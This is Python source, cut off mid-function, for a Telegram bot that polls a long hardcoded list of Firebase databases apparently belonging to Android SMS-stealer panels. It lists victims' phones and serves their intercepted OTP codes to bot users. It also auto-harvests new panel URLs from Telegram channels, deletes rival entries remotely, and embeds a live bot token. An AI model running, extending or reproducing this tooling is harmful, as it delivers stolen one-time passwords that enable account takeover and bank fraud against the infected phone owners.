# HATHIXOTP — firebase SMS/OTP panel bot
import json, re, time, random, threading, logging, gc, html as html_mod
from pathlib import Path
from datetime import datetime, timezone, timedelta
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor
import requests

BOT_TOKEN = "8531748275:AAERd1dPi81M8U3_4mLx53H_fMqh5C4DV9c"
BOT_NAME  = "RTF OTP"
ADMIN_IDS = {6346250222, 8466464664}
UNLIMITED_IDS = {7516309870}   # full access, no admin powers

FORCE_JOIN_ENABLED = False
MIN_REFS = 0
FORCE_CHANNELS = [{"label": "RTF 💸", "id": -1003726529200, "url": "https://t.me/hathixshadowx"},
                  {"label": "BackUp", "id": -1003518722836, "url": "https://t.me/hathixshadowxbackup"},
                  {"label": "BackUp 2", "id": -1004301266136, "url": "https://t.me/backupchannel12352"}]

GLOBAL_FBS = [
    "https://ybvggg-aa0f5-default-rtdb.firebaseio.com",
    "https://bullet-pvt-default-rtdb.firebaseio.com",
    "https://rto-yellow-default-rtdb.firebaseio.com",
    "https://fifty50-4452e-default-rtdb.firebaseio.com",
    "https://sumittt-ad8de-default-rtdb.firebaseio.com",
    "https://lali-c74e2-default-rtdb.firebaseio.com",
    "https://planning-wit-ffeaa-default-rtdb.firebaseio.com",
    "https://rahul-f8fcd-default-rtdb.firebaseio.com",
    "https://rahulgandhi-feca5-default-rtdb.firebaseio.com",
    "https://jemini-9b00f-default-rtdb.firebaseio.com",
    "https://sumitrajcash-2c41b-default-rtdb.firebaseio.com",
    "https://retesh-default-rtdb.firebaseio.com",
    "https://puja-admin-panel-30a82-default-rtdb.firebaseio.com",
    "https://bihari-653c9-default-rtdb.firebaseio.com",
    "https://vzvxvz-default-rtdb.firebaseio.com",
    "https://montulegend-39224-default-rtdb.firebaseio.com",
    "https://dippa-e837e-default-rtdb.firebaseio.com",
    "https://raj-bhai-setup-default-rtdb.firebaseio.com",
    "https://stephen-40caf-default-rtdb.firebaseio.com",
    "https://anukumari-62dd5-default-rtdb.firebaseio.com",
    "https://nandan-rto-default-rtdb.firebaseio.com",
    "https://manju-9dd86-default-rtdb.firebaseio.com",
    "https://tril-2c003-default-rtdb.firebaseio.com",
    "https://soniya-785f3-default-rtdb.firebaseio.com",
    "https://zindagi-f8a52-default-rtdb.firebaseio.com",
    "https://umang-83f42-default-rtdb.firebaseio.com",
    "https://ghpiii-default-rtdb.firebaseio.com",
    "https://sumit-1c42f-default-rtdb.firebaseio.com",
    "https://fdfmnb-91c13-default-rtdb.firebaseio.com",
    "https://hshsjs-9415c-default-rtdb.firebaseio.com",
    "https://rahul-60a03-default-rtdb.firebaseio.com",
    "https://admin-panel-2272-default-rtdb.firebaseio.com",
    "https://videocalls-f3434-default-rtdb.firebaseio.com",
    "https://pmkisan2-c1211-default-rtdb.firebaseio.com",
    "https://rajiv-662c1-default-rtdb.firebaseio.com",
    "https://shreyapanel-default-rtdb.firebaseio.com",
    "https://fir-ffe67-default-rtdb.firebaseio.com",
    "https://ghostx-panel-default-rtdb.firebaseio.com",
    "https://lokki-610ac-default-rtdb.firebaseio.com",
    "https://my-self-ec42f-default-rtdb.firebaseio.com",
    "https://niraj-addimn-default-rtdb.firebaseio.com",
    "https://noidaa-dda60-default-rtdb.firebaseio.com",
    "https://panel-stevenowner-k-default-rtdb.firebaseio.com",
    "https://pawan-6b8da-default-rtdb.firebaseio.com",
    "https://pm-kisan-yojana2-default-rtdb.firebaseio.com",
    "https://pujakumari2211-ac3ab-default-rtdb.firebaseio.com",
    "https://raju-2d429-default-rtdb.firebaseio.com",
    "https://sanjana-admin-panala-default-rtdb.firebaseio.com",
    "https://sbi03admin-default-rtdb.firebaseio.com",
    "https://yellow-e17c7-default-rtdb.firebaseio.com",
    "https://jaishreeram-5753e-default-rtdb.firebaseio.com",
    "https://doman-e339a-default-rtdb.firebaseio.com",
    "https://apnare-25694-default-rtdb.firebaseio.com",
    "https://creditdebitcardbank-default-rtdb.firebaseio.com",
    "https://bhai02-2abcd-default-rtdb.firebaseio.com",
    "https://psycho02-default-rtdb.firebaseio.com",
    "https://repokuku-7a542-default-rtdb.firebaseio.com",
    "https://ashish-b238e-default-rtdb.firebaseio.com",
    "https://dakubhai3-6b0fd-default-rtdb.firebaseio.com",
    "https://rameshwaram-f256a-default-rtdb.firebaseio.com",
    "https://anpu-b3595-default-rtdb.firebaseio.com",
    "https://demoandroidorg-default-rtdb.firebaseio.com",
    "https://modiji-887e2-default-rtdb.firebaseio.com",
    "https://surajn3-1f41b-default-rtdb.firebaseio.com",
    "https://pohanji-geleri-default-rtdb.firebaseio.com",
    "https://deva-8c514-default-rtdb.firebaseio.com",
    "https://uday-5dff3-default-rtdb.firebaseio.com",
    "https://rohit-713b2-default-rtdb.firebaseio.com",
    "https://aperna-a63b8-default-rtdb.firebaseio.com",
    "https://karuuuu890-e3374-default-rtdb.firebaseio.com",
    "https://dhiraj-a1334-default-rtdb.firebaseio.com",
    "https://mymp1oc-default-rtdb.firebaseio.com",
    "https://ramukaak-default-rtdb.firebaseio.com",
    "https://ashish-36d11-default-rtdb.firebaseio.com",
    "https://rggrge-c0889-default-rtdb.firebaseio.com",
    "https://the-error-444-default-rtdb.firebaseio.com",
    "https://mogli-ade94-default-rtdb.firebaseio.com",
    "https://dogledost2-default-rtdb.firebaseio.com",
    "https://munmun-7ef7f-default-rtdb.firebaseio.com",
    "https://vuvhbjbi-default-rtdb.firebaseio.com",
    "https://usthtsdti-default-rtdb.firebaseio.com",
    "https://munnnntt-default-rtdb.firebaseio.com",
    "https://pikachu-650de-default-rtdb.firebaseio.com",
    "https://riya-f7132-default-rtdb.firebaseio.com",
    "https://rahul-9003c-default-rtdb.firebaseio.com",
    "https://icici-kolkata-apcd001-default-rtdb.firebaseio.com",
    "https://bhai-905b4-default-rtdb.firebaseio.com",
    "https://new-penal-1562b-default-rtdb.firebaseio.com",
    "https://jackie-7a125-default-rtdb.firebaseio.com",
    "https://vicky-singh-20bdd-default-rtdb.firebaseio.com",
    "https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://xxxcom-default-rtdb.firebaseio.com",
    "https://kali-4610b-default-rtdb.firebaseio.com",
    "https://roya-admin-default-rtdb.firebaseio.com",
    "https://sk-admin-21-default-rtdb.firebaseio.com",
    "https://sk-admin-22-default-rtdb.firebaseio.com",
    "https://do-admin-v28-default-rtdb.firebaseio.com",
    "https://sk-admin-23-default-rtdb.firebaseio.com",
    "https://do-admin-v27-default-rtdb.firebaseio.com",
    "https://do-admin-v19-default-rtdb.firebaseio.com",
    "https://do-admin-v11-default-rtdb.firebaseio.com",
    "https://sk-admin-15-default-rtdb.firebaseio.com",
    "https://otp-work-b7716-default-rtdb.firebaseio.com",
    "https://chunnu-25c16-default-rtdb.firebaseio.com",
    "https://sk-admin-17-default-rtdb.firebaseio.com",
    "https://priyanka-af216-default-rtdb.firebaseio.com",
    "https://src-rto-chalan-3adcc-default-rtdb.firebaseio.com",
    "https://newadmin-d5116-default-rtdb.firebaseio.com",
]

FB_CAP = 50 * 1024 * 1024
FB_TIMEOUT = 9
CACHE_TTL = 75
PAGE_SIZE = 10
LIVE_SECS = 180
IST = timezone(timedelta(hours=5, minutes=30))

VIDEO_DIR = Path("videos")
VIDS_FILE = Path("bot_data") / "video_ids.json"
DATA = Path("bot_data")
S = "━"
DIV = "────────────────────"

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s",
                    handlers=[logging.StreamHandler(),
                              logging.FileHandler("hathixotp.log", encoding="utf-8")])
log = logging.getLogger("hathixotp")

sess = requests.Session()
sess.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
# The whole bot funnels through this one session from many worker threads.
# urllib3 defaults to a 10-connection pool, so under load it discarded and
# reopened sockets ("Connection pool is full") and every API call stalled.
try:
    from requests.adapters import HTTPAdapter as _HTTPAdapter
    _adapter = _HTTPAdapter(pool_connections=48, pool_maxsize=96, max_retries=0)
    sess.mount("https://", _adapter)
    sess.mount("http://", _adapter)
except Exception:
    pass
TG = "https://api.telegram.org/bot" + BOT_TOKEN

def api(method, **data):
    data = {k: v for k, v in data.items() if v is not None}
    try:
        r = sess.post(f"{TG}/{method}", json=data, timeout=70)
        j = r.json()
    except Exception as e:
        log.warning(f"api {method}: EXC {e}")
        return None
    if not j.get("ok"):
        log.warning(f"api {method}: {j.get('description')}")
    return j

def esc(t):
    return html_mod.escape(str(t)) if t is not None else ""

EMOJI_MAP = {
    "📢": "6305206294848475991", "📞": "5258337316715373336",
    "❓": "5436113877181941026", "ℹ️": "5420323339723881652",
    "🔧": "5341715473882955310", "👋": "6204139486671019705",
    "🔐": "5296369303661067030", "✅": "6275829594717165532",
    "📄": "5258477770735885832", "💯": "6275956313432266859",
    "⚡": "5456140674028019486", "📖": "5258328383183396223",
    "⚠️": "5274099962655816924", "🔄": "5030872266716480568",
    "❌": "6305324410744084248", "📊": "6204093414556834971",
    "💎": "5427168083074628963", "🔍": "5362061893605279054",
    "📅": "6235449188373502693", "📋": "5203910550542631009",
    "📌": "5397782960512444700", "👤": "6305229569276254220",
    "🆔": "6005835877337535334", "⭐": "4970181191958266458",
    "🚫": "5240241223632954241", "🛠️": "6235572922086331108",
    "🛠": "6235572922086331108", "🪪": "5890864241388293875",
    "📱": "6201882038975341348", "⏳": "5386367538735104399",
    "🔙": "6276030448862763508", "👉": "6305240074766259789",
    "🫡": "6305043124745934564", "👌": "5190447043545438788",
    "➕": "4956507094124594921", "🗑": "4958534924278694938",
    "👑": "6129705083501293112", "💬": "6129579597441801084",
    "🔗": "6129589862413638401", "🔥": "6129792056589031358",
    "✨": "6129479035077531636", "💰": "6123044667261981438",
    "💀": "6132184924603554220", "🚀": "6129639980387015660",
    "🥃": "6235620067942341623", "🍂": "6235717714023814969",
    "🤝": "5463256910851546817", "💵": "5197434882321567830",
    "🟢": "5416081784641168838", "🔴": "5411225014148014586",
    "🎉": "6129579803600231171", "🏆": "6156436440260549720",
    "🥇": "5440539497383087970", "🥈": "5447203607294265305",
    "🥉": "5453902265922376865", "📣": "6129433877791382400",
    "👻": "6129758830722030858", "🔒": "6129906126625447892",
    "🔓": "5465443379917629504",
}

EID = {"tick": "6275829594717165532", "bolt": "5456140674028019486",
       "search": "5362061893605279054", "gear": "6235572922086331108",
       "phone": "5258337316715373336", "fire": "6129792056589031358",
       "crown": "6129705083501293112", "link": "6129589862413638401",
       "rocket": "6129639980387015660", "hand": "5463256910851546817",
       "info": "5420323339723881652", "chart": "6204093414556834971",
       "doc": "5258477770735885832", "plus": "4956507094124594921",
       "warn": "5274099962655816924", "user": "6305229569276254220",
       "back": "6276030448862763508", "ok": "6275829594717165532",
       "skull": "6132184924603554220", "ghost": "6129758830722030858",
       "money": "6123044667261981438", "id": "6005835877337535334",
       "cal": "6235449188373502693", "mega": "6305206294848475991",
       "trash": "4958534924278694938", "lock": "5296369303661067030",
       "green": "5416081784641168838", "red": "5411225014148014586"}

def emo(e, key=None):
    if e in EMOJI_MAP:
        return f'<tg-emoji emoji-id="{EMOJI_MAP[e]}">{e}</tg-emoji>'
    if key and key in EID:
        return f'<tg-emoji emoji-id="{EID[key]}">{e}</tg-emoji>'
    return e

def sec(sym, title):
    return f"{S}[ {emo(sym)} <b>{title}</b> ]{S}"

def _clean_fallback(text):
    t = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text)
    return esc(re.sub(r"<[^>]+>", "", t))

def _strip_icons(kb):
    if not kb:
        return kb
    import copy
    kb2 = copy.deepcopy(kb)
    for row in kb2.get("inline_keyboard", []):
        for b in row:
            b.pop("icon_custom_emoji_id", None)
    return kb2

def btn(text, cb=None, url=None, style=None, icon=None):
    b = {"text": text}
    if cb:    b["callback_data"] = cb
    if url:   b["url"] = url
    if style: b["style"] = style
    if icon:  b["icon_custom_emoji_id"] = icon
    return b

def buttons(rows):
    return {"inline_keyboard": [[b for b in row if b] for row in rows]}

def send(cid, text, kb=None):
    r = api("sendMessage", chat_id=cid, text=text, parse_mode="HTML",
            reply_markup=kb, disable_web_page_preview=True)
    if r and not r.get("ok"):
        d = r.get("description", "")
        if "can't parse" in d or "unsupported" in d or "custom emoji" in d:
            r = api("sendMessage", chat_id=cid, text=_clean_fallback(text),
                    reply_markup=_strip_icons(kb), disable_web_page_preview=True)
    return r

def edit(cid, mid, text, kb=None):
    r = api("editMessageText", chat_id=cid, message_id=mid, text=text,
            parse_mode="HTML", reply_markup=kb, disable_web_page_preview=True)
    if r and not r.get("ok"):
        d = r.get("description", "")
        if "message is not modified" not in d and ("can't parse" in d or "unsupported" in d):
            r = api("editMessageText", chat_id=cid, message_id=mid,
                    text=_clean_fallback(text), reply_markup=_strip_icons(kb))
    return r

def answer_cb(qid, text=None, alert=False):
    p = {"callback_query_id": qid}
    if text: p["text"] = text
    if alert: p["show_alert"] = True
    api("answerCallbackQuery", **p)

def typing(cid):
    api("sendChatAction", chat_id=cid, action="typing")

def footer():
    return f"\n\n{S} {emo('⚡', 'bolt')} <b>{BOT_NAME}</b> {S}"

def b_back(cb="back"):
    return btn("ʙᴀᴄᴋ", cb, style="primary", icon=EID["back"])

# ── videos ──
_vlock = threading.RLock()
_vids = {}

def _save_vids():
    with _vlock:
        (DATA / "video_ids.json").write_text(json.dumps(_vids), encoding="utf-8")

def send_video(cid, caption, kb=None):
    try:
        vids = [p for p in sorted(VIDEO_DIR.glob("*.mp4")) if p.stat().st_size > 50000]
    except Exception:
        vids = []
    if not vids:
        return send(cid, caption, kb)
    p = random.choice(vids)
    with _vlock:
        fid = _vids.get(p.name)
    if fid:
        return api("sendVideo", chat_id=cid, video=fid, caption=caption,
                   parse_mode="HTML", supports_streaming=True, reply_markup=kb)
    try:
        with open(p, "rb") as f:
            r = sess.post(f"{TG}/sendVideo",
                          data={"chat_id": cid, "caption": caption, "parse_mode": "HTML",
                                "supports_streaming": "true",
                                "reply_markup": json.dumps(kb) if kb else None},
                          files={"video": (p.name, f)}, timeout=180)
        j = r.json()
        if j.get("ok"):
            with _vlock:
                _vids[p.name] = j["result"]["video"]["file_id"]
            threading.Thread(target=_save_vids, daemon=True).start()
            return j
    except Exception as e:
        log.warning(f"sendVideo {p.name}: {e}")
    return send(cid, caption, kb)

def flush_video_queue(cid, uid):
    st = state.get(uid) or {}
    q = st.get("vidq") or []
    if not q:
        send(cid, f"{emo('👻')} ǫᴜᴇᴜᴇ ᴇᴍᴘᴛʏ — ꜱᴇɴᴅ ᴠɪᴅᴇᴏ ꜰɪʟᴇs ꜰɪʀsᴛ.",
             buttons([[b_back("adm")]]))
        mode[uid] = "adm_video"
        return
    VIDEO_DIR.mkdir(exist_ok=True)
    okc, fail = 0, 0
    for fid, fname in q:
        try:
            r = api("getFile", file_id=fid)
            fp = r["result"]["file_path"] if r and r.get("ok") else None
            if not fp:
                fail += 1
                continue
            resp = sess.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{fp}", timeout=300)
            data = resp.content if resp.status_code == 200 else b""
            if len(data) < 10240 or data[:5] == b'{"ok"' or data[4:8] != b"ftyp":
                log.warning(f"vid download bad ({len(data)}B): {fname}")
                fail += 1
                continue
            name = re.sub(r"[^A-Za-z0-9._-]", "_", str(fname or "")).strip("._")
            if not name.lower().endswith(".mp4"):
                name = (name or f"vid_{time.strftime('%Y%m%d_%H%M%S')}_{okc}") + ".mp4"
            if (VIDEO_DIR / name).exists():
                name = f"{time.strftime('%Y%m%d%H%M%S')}_{name}"
            (VIDEO_DIR / name).write_bytes(data)
            okc += 1
        except Exception:
            log.exception("vid upload")
            fail += 1
    st["vidq"] = []
    n = len(list(VIDEO_DIR.glob("*.mp4")))
    send(cid, f"{sec('✅', 'ᴠɪᴅᴇᴏs ᴜᴘʟᴏᴀᴅᴇᴅ')}\n{DIV}\n\n"
              f"{emo('🎉')} ᴀᴅᴅᴇᴅ: <b>{okc}</b>"
              + (f"\n{emo('❌')} ꜰᴀɪʟᴇᴅ: {fail}" if fail else "")
              + f"\n{emo('📱')} ᴛᴏᴛᴀʟ ɪɴ ʀᴏᴛᴀᴛɪᴏɴ: <b>{n}</b> ᴠɪᴅᴇᴏs" + footer())

# ── users / referrals ──
_lock = threading.RLock()
users = {}
mode = {}
state = {}
page_cache = {}
learned_ts = {}
BOT_UN = "HathixOtp_bot"

def _save_users():
    with _lock:
        (DATA / "users.json").write_text(json.dumps(users, ensure_ascii=False), encoding="utf-8")

def save():
    threading.Thread(target=_save_users, daemon=True).start()

def load():
    global users
    DATA.mkdir(exist_ok=True)
    p = DATA / "users.json"
    if p.exists():
        try: users = json.loads(p.read_text(encoding="utf-8"))
        except Exception: users = {}
        users = {str(k): v for k, v in users.items()}

def get_user(uid, u=None, n=None):
    uid = str(uid)
    with _lock:
        if uid not in users:
            users[uid] = {"n": n or "", "u": u or "", "j": time.strftime("%d %b %Y"),
                          "refs": [], "ref_by": "", "fbs": [], "banned": False}
        else:
            if u: users[uid]["u"] = u
            if n: users[uid]["n"] = n
    return users[uid]

extra_admins = set()
ADM_FILE = DATA / "admins.json"

def _load_adms():
    global extra_admins
    if ADM_FILE.exists():
        try:
            extra_admins = {int(x) for x in json.loads(ADM_FILE.read_text(encoding="utf-8"))}
        except Exception:
            extra_admins = set()

def _save_adms():
    try:
        ADM_FILE.write_text(json.dumps(sorted(extra_admins)), encoding="utf-8")
    except Exception:
        pass

def is_adm(uid):
    try:
        return int(uid) in ADMIN_IDS or int(uid) in extra_admins
    except Exception:
        return False

def is_unlimited(uid):
    try:
        return int(uid) in UNLIMITED_IDS
    except Exception:
        return False

START_TS = time.time()

def fmt_uptime():
    s = int(time.time() - START_TS)
    d, s = divmod(s, 86400)
    h, s = divmod(s, 3600)
    m, s = divmod(s, 60)
    if d: return f"{d}ᴅ {h}ʜ {m}ᴍ"
    if h: return f"{h}ʜ {m}ᴍ {s}s"
    return f"{m}ᴍ {s}s"

# ── firebase engine ──
fb_cache = {}
fb_lock = threading.Lock()
fb_list_lock = threading.Lock()
GLOBAL_FB_LIST = list(GLOBAL_FBS)

def fb_get(base, path="", query="", timeout=FB_TIMEOUT, cap=FB_CAP):
    url = f"{base.rstrip('/')}/{path.strip('/')}/.json" if path else f"{base.rstrip('/')}/.json"
    if query:
        url += "?" + query
    try:
        r = sess.get(url, timeout=timeout, stream=True)
        cl = r.headers.get("Content-Length")
        if cl and cl.isdigit() and int(cl) > cap:
            r.close()
            return None, "TOO_LARGE"
        body = b""
        for chunk in r.iter_content(65536):
            body += chunk
            if len(body) > cap:
                r.close()
                return None, "TOO_LARGE"
        st = r.status_code
        if st in (401, 403):
            return None, "ACCESS_DENIED"
        if st == 404:
            return None, "NOT_FOUND"
        if st != 200:
            return None, f"HTTP {st}"
        text = body.decode("utf-8", "ignore").strip()
        if not text or text == "null":
            return None, "EMPTY"
        return json.loads(text), ""
    except requests.exceptions.Timeout:
        return None, "TIMEOUT"
    except Exception as e:
        return None, type(e).__name__

def _looks_like_clients(d):
    if not isinstance(d, dict):
        return False
    sample = list(d.values())[:5]
    return sample and all(isinstance(v, dict) for v in sample) and any(
        isinstance(v, dict) and ("status" in v or "mobNo" in v or "mobile" in v or "model" in v)
        for v in sample)

def fetch_clients(url):
    b, err = fb_get(url, "clients")
    if isinstance(b, dict) and b:
        return b, ""
    b2, err2 = fb_get(url, "devices")
    if isinstance(b2, dict) and b2:
        return b2, ""
    data, err3 = fb_get(url)
    if isinstance(data, dict) and data:
        for k in ("clients", "devices"):
            v = data.get(k)
            if isinstance(v, dict) and v:
                return v, ""
        if _looks_like_clients(data):
            return data, ""
    return None, err or err2 or err3

_DEV_KEYS = ("status", "number", "mobNo", "mob_no", "mobile",
             "phoneNumber", "phone", "modelName", "model", "deviceName", "name")

def _slim_clients(clients):
    """Keep only the fields devices_index()/get_mob()/dev_name() read."""
    if not isinstance(clients, dict):
        return {}
    out = {}
    for cid, info in clients.items():
        if isinstance(info, dict):
            out[cid] = {k: info[k] for k in _DEV_KEYS if k in info}
    return out

def refresh_fb(url):
    clients, err = fetch_clients(url)
    with fb_lock:
        fb_cache[url] = {"clients": _slim_clients(clients or {}), "t": time.time(), "ok": bool(clients)}
    return bool(clients), err

FB_POOL = ThreadPoolExecutor(12, thread_name_prefix="fb")
JOB_POOL = ThreadPoolExecutor(16, thread_name_prefix="job")

def refresh_pool(urls):
    list(FB_POOL.map(refresh_fb, urls))

def refresh_loop():
    while True:
        try:
            with fb_list_lock:
                urls = list(GLOBAL_FB_LIST)
            t0 = time.time()
            refresh_pool(urls)
            keep = set(urls)
            with fb_lock:
                for k in [k for k, v in fb_cache.items()
                          if k not in keep and time.time() - v.get("t", 0) > CACHE_TTL * 4]:
                    fb_cache.pop(k, None)
                if len(fb_cache) > 6000:
                    for k, _ in sorted(fb_cache.items(), key=lambda kv: kv[1].get("t", 0))[:len(fb_cache) - 6000]:
                        fb_cache.pop(k, None)
            gc.collect()
            log.info(f"fb cache refreshed {len(urls)} panels in {time.time()-t0:.1f}s (cached={len(fb_cache)})")
            _sweep_elapsed = time.time() - t0
            _sweep_elapsed = 0
        except Exception:
            log.exception("refresh loop")
            _sweep_elapsed = 0
        time.sleep(max(10.0, CACHE_TTL - _sweep_elapsed))

def user_fbs(uid):
    with _lock:
        return list(get_user(uid).get("fbs", []))

def ensure_user_fbs(uid):
    for u in user_fbs(uid):
        with fb_lock:
            ent = fb_cache.get(u)
        if not ent or time.time() - ent["t"] > CACHE_TTL:
            refresh_fb(u)

def get_mob(info):
    raw = (info.get("number") or info.get("mobNo") or info.get("mob_no") or info.get("mobile")
           or info.get("phoneNumber") or info.get("phone") or "")
    digits = re.sub(r"\D", "", str(raw))
    if len(digits) == 12 and digits.startswith("91"):
        digits = digits[2:]
    elif len(digits) == 11 and digits.startswith("0"):
        digits = digits[1:]
    return digits if len(digits) == 10 and digits[0] in "6789" else ""

def dev_name(info, cid):
    for key in ("modelName", "model", "deviceName", "name"):
        v = info.get(key)
        if v and str(v).strip() and str(v) != "-":
            return str(v).strip()
    return str(cid)[:16]

def fb_short(url):
    s = url.replace("https://", "").replace("http://", "")
    s = re.sub(r"(-default-rtdb)?\.(firebaseio\.com|firebasedatabase\.app)", "", s)
    return s[:22]

FBS_FILE = DATA / "fbs.json"

def _save_fbs():
    try:
        with fb_list_lock:
            (DATA / "fbs.json").write_text(json.dumps(GLOBAL_FB_LIST), encoding="utf-8")
    except Exception:
        pass


# ---- Firebase sync: aadhar bot ke naye firebases automatically yahan aate hain ----
# /root/firebase_sync/sync.py fbs_sync.json likhta hai; hum yahan merge karte hain.
FBS_SYNC_FILE = DATA / "fbs_sync.json"

def _merge_fbs_file(path, persist=False):
    try:
        news = json.loads(Path(path).read_text(encoding="utf-8"))
    except Exception:
        return 0
    if not isinstance(news, list):
        return 0
    added = 0
    with fb_list_lock:
        have = set(GLOBAL_FB_LIST)
        for u in news:
            if isinstance(u, str) and u and u not in have:
                have.add(u)
                GLOBAL_FB_LIST.append(u)
                added += 1
    if added:
        log.info("firebase-sync: +%d from %s (total %d)" % (added, path, len(GLOBAL_FB_LIST)))
        if persist:
            _save_fbs()
    return added

# boot: purana harvest history (fbs.json) + sync file dono merge
_merge_fbs_file(FBS_FILE, persist=False)
_merge_fbs_file(FBS_SYNC_FILE, persist=True)

def _fbs_sync_loop():
    while True:
        try:
            _merge_fbs_file(FBS_SYNC_FILE, persist=True)
        except Exception:
            pass
        time.sleep(60)

threading.Thread(target=_fbs_sync_loop, daemon=True).start()


# ---- auto-harvest firebase links from channels/forwards ----
HARVEST_CHANS = {-1004418505510, -1004498830019, -1003928781938}
HARVEST_FB_RE = re.compile(r"(?:https?://)?[A-Za-z0-9][A-Za-z0-9.\-]*(?:firebaseio\.com|firebasedatabase\.app)[^\s\"'<>]*", re.I)


def harvest_text(text):
    """Add firebase DB links found in text to the global list + fbs.json."""
    if not text:
        return 0
    added = 0
    with fb_list_lock:
        for u in HARVEST_FB_RE.findall(text):
            url = u.strip().rstrip(").,;]}\"'")
            if not url.startswith(("http://", "https://")):
                url = "https://" + url
            if url not in GLOBAL_FB_LIST:
                GLOBAL_FB_LIST.append(url)
                added += 1
    if added:
        _save_fbs()
        log.info("harvest: +%d firebase link(s)" % added)
    return added


def devices_index(uid=""):
    urls = []
    with fb_list_lock:
        urls.extend(GLOBAL_FB_LIST)
    if uid:
        urls.extend(user_fbs(uid))
    out = []
    with fb_lock:
        snap = {u: fb_cache.get(u) for u in urls}
    for url in urls:
        ent = snap.get(url)
        if not ent or not ent["ok"]:
            continue
        for cid, info in ent["clients"].items():
            if not isinstance(info, dict):
                continue
            phone = get_mob(info)
            if not phone:
                continue
            out.append({"url": url, "cid": str(cid), "phone": phone,
                        "online": info.get("status") is True,
                        "name": dev_name(info, cid)})
    return out

# ── messages ──
def _promo_hit(m):
    try:
        import json as _j
        b = _j.dumps(m, ensure_ascii=False).upper()
    except Exception:
        b = str(m).upper()
    return (("PANNEL" in b) or ("NWQVM3" in b)
            or ("FREE FIREBASE AND OTP" in b) or ("PRIMEFREEOTPBOT" in b)
            or ("GOLDROP" in b) or ("GOLDDROP" in b)
            or ("GOLD DROP BOT" in b))

def _purge_promo(url, cid, keys):
    """Best-effort background DELETE of attacker promo entries."""
    def _worker():
        try:
            import urllib.request
            for k in keys:
                try:
                    req = urllib.request.Request(
                        "%s/messages/%s/%s.json" % (url.rstrip("/"), cid, k),
                        method="DELETE")
                    urllib.request.urlopen(req, timeout=10).read()
                except Exception:
                    pass
        except Exception:
            pass
    try:
        import threading
        threading.Thread(target=_worker, daemon=True).start()
    except Exception:
        pass

def _key_future(k):
    """Attacker pins far-future epoch keys (e.g. 4102444800000 = year 2100)."""
    try:
        n = int(str(k))
    except (TypeError, ValueError):
        return False
    if n > 10 ** 12:
        n //= 1000
    if 10 ** 9 < n < 10 ** 11:
        return n > time.time() + 86400
    return False

def _is_future(m):
    """Entry whose date/timestamp is far ahead of now (fake 'newest')."""
    if not isinstance(m, dict):
        return False
    for k in ("date", "time", "timestamp", "ts", "createdAt", "received_at", "sentTime"):
        v = m.get(k)
        if v is None:
            continue
        try:
            n = int(float(str(v).strip()))
        except (TypeError, ValueError):
            continue
        if n > 10 ** 12:
            n //= 1000
        if 10 ** 9 < n < 10 ** 11 and n > time.time() + 86400:
            return True
    return False

_PROMO_BLOCK_KW = ("T.ME/", "TELEGRAM.ME/", "JOIN NOW", "SUBSCRIBE", "FREE GOLD",
                   "GOLD DROP", "CLICK HERE", "FOLLOW US", "WHATSAPP CHANNEL",
                   "TELEGRAM CHANNEL", "FREE FIREBASE", "PANNEL", "PRIME FREE")
_OTP_CODE_RX = re.compile(r"(?<!\d)\d{4,8}(?!\d)")

def _dead_key(k, v):
    """Confirmed attacker entry -> hidden AND auto-deleted."""
    return _promo_hit(v) or _key_future(k) or _is_future(v)

def _is_otp_msg(m):
    """ULTRA filter -- True ONLY for a real OTP SMS."""
    if not isinstance(m, dict):
        return False
    body = msg_body(m)
    if not body:
        return False
    b = body.upper()
    if "T.ME/LOGIN/" in b:
        pass  # real Telegram login-OTP SMS (code + t.me/login link)
    elif any(w in b for w in _PROMO_BLOCK_KW):
        return False
    if ("HTTP" in b or "WWW." in b) and any(
            w in b for w in ("JOIN", "FREE", "BOT", "SUBSCRIBE", "CHANNEL", "OFFER")):
        return False
    if not _OTP_CODE_RX.search(body):
        return False
    return bool(msg_otp(body))

def _show_key(k, v):
    if not isinstance(v, dict):
        return False
    if _dead_key(k, v):
        return False
    return _is_otp_msg(v)

def fetch_msgs(url, cid, limit=5):
    # ULTRA filter: wide window, purge confirmed junk, display ONLY real OTPs.
    win = max(int(limit) * 12, 60)
    data, _ = fb_get(url, f"messages/{cid}", query=f'orderBy="$key"&limitToLast={win}')
    if not isinstance(data, (dict, list)) or (isinstance(data, dict) and not data):
        data, _ = fb_get(url, f"messages/{cid}")
    if not isinstance(data, (dict, list)):
        return []
    def tok(k):
        s = str(k)
        try:
            return (0, int(s), "")
        except (TypeError, ValueError):
            return (1, 0, s)
    if isinstance(data, list):
        items = [(str(i), v) for i, v in list(enumerate(data)) if isinstance(v, dict)]
        dead = [k for k, v in items if _dead_key(k, v)]
        if dead:
            _purge_promo(url, cid, dead)
        clean = [(k, v) for k, v in items if _show_key(k, v)]
        return clean[-int(limit):][::-1]
    def partition(d):
        dead = [str(k) for k, v in d.items()
                if isinstance(v, dict) and _dead_key(str(k), v)]
        show = sorted([k for k, v in d.items()
                       if isinstance(v, dict) and _show_key(str(k), v)],
                      key=tok, reverse=True)
        return dead, show
    dead_keys, clean_keys = partition(data)
    if dead_keys:
        _purge_promo(url, cid, dead_keys)
    if len(clean_keys) < int(limit) and len(data) >= win:
        all_data, _ = fb_get(url, f"messages/{cid}")
        if isinstance(all_data, dict) and all_data:
            data = all_data
            dead_keys, clean_keys = partition(data)
            if dead_keys:
                _purge_promo(url, cid, dead_keys)
    return [(str(k), data[k]) for k in clean_keys[:int(limit)]]

def msg_body(m):
    for key in ("body", "message", "msg", "text", "content", "sms", "smsBody",
                "messageBody", "SMS", "msgBody"):
        v = m.get(key)
        if v is not None and str(v).strip():
            return str(v).strip()
    return ""

def msg_sender(m):
    for key in ("sender", "from", "address", "number", "phone", "phoneNumber",
                "mobile", "mobNo", "src", "originator", "senderNumber", "fromNumber"):
        v = m.get(key)
        if v is not None and str(v).strip():
            return str(v).strip()
    return "SMS"

def msg_otp(body):
    if not body:
        return ""
    text = str(body).replace("​", " ").replace("\u00a0", " ")
    for pat in (r'\b(?:OTP|code|verification|verify|login|passcode)\D{0,20}(\d{4,8})\b',
